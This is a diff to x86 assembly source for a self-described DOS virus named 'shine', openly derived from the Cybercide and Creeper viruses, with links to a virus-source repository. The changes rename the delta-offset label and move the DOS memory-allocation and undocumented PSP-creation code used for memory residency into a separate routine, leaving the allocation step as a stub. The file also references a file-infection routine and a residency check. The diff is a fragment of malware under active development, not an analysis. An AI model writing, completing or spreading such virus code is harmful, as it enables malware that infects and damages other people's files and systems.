@@ -1,14 +1,16 @@
 ;---------------
 ; The shine DOS virus
 ; Based on the Cybercide DOS virus
+; And the Creeper virus, no not the "catch me if you can" one, the MS-DOS one
 ; Here's the link: https://github.com/guitmz/virii/blob/master/c/CYBRCIDE.ASM, whew, that was a mouthfull 
+; And hers to creeper: https://github.com/guitmz/virii/blob/master/c/CREEPER.ASM
 
 org 0h
 
 beninging:
 
-call near start  ; To calculate delta offset
-start:
+call near get_delta   ; To calculate delta offset
+get_delta:
      pop bp           ; BP = Delta+3
      sub bp, 3        ; To get to the True start of the virus
      mov word [data_section.save_bp+bp], bp
@@ -19,14 +21,8 @@ start:
      cmp ax, 8b7bh    ; Is AX 8b7b?
      je dont_install
 
-alloc_mem:            ; We are in fact not in memory, lets relocate us away from here
-     mov ax, 4800h    ; Function 48h Allocate Memory Blocks
-     mov bx, 20h      ; Allocate 32 paragraphs, 512 bytes
-     int 21h          ; Calling DOS
-     mov dx, ax       ; DX => AX
-     mov ax, 5500h    ; Create New PSP (Undocumented..... ooooo, spooky)
-     mov si, 15h      ; Top of Memory
-     int 21h          ; Call DOS
+alloc_mem:            ; Ok guys, here comes the interesting and scary part. We gotta manually allocate memory, we cant use int 21h
+                      ; Cuz it aint working the way i want it to work
      
 
 
@@ -139,7 +135,17 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
 
 .abort_infection:
      ret
-        
+
+old_alloc_mem:        ; We are in fact not in memory, lets relocate us away from here
+     mov ax, 4800h    ; Function 48h Allocate Memory Blocks
+     mov bx, 20h      ; Allocate 32 paragraphs, 512 bytes
+     int 21h          ; Calling DOS
+     mov dx, ax       ; DX => AX
+     mov ax, 5500h    ; Create New PSP (Undocumented..... ooooo, spooky)
+     mov si, 15h      ; Top of Memory
+     int 21h          ; Call DOS
+
+
 data_section:
      .save_bp dw 0
      .MZ_BUF dw 0
